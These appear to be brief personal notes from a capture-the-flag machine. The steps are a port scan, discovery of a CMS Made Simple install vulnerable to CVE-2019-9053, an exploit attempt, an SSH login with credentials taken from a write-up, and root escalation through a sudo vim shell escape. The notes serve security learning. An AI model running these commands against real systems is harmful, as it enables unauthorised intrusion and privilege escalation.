commands used:

nmap -p- --min-rate 5000 -sV target -oN nmap.txt

21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

gobuster 
/simple

CMS Made Simple 2.2.8 - cve-2019-9053

convert python2 format (just the print functions) to pyhton3

./exploit.py -u target/simple --crack -w seclist/passwords/common-credentials/best110.txt

None of the cve-2019-9053 exploit worked, looked up a write up
username - mitch
password - secret

ssh -p 2222 mitch@target

sudo -l
(root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/sh'

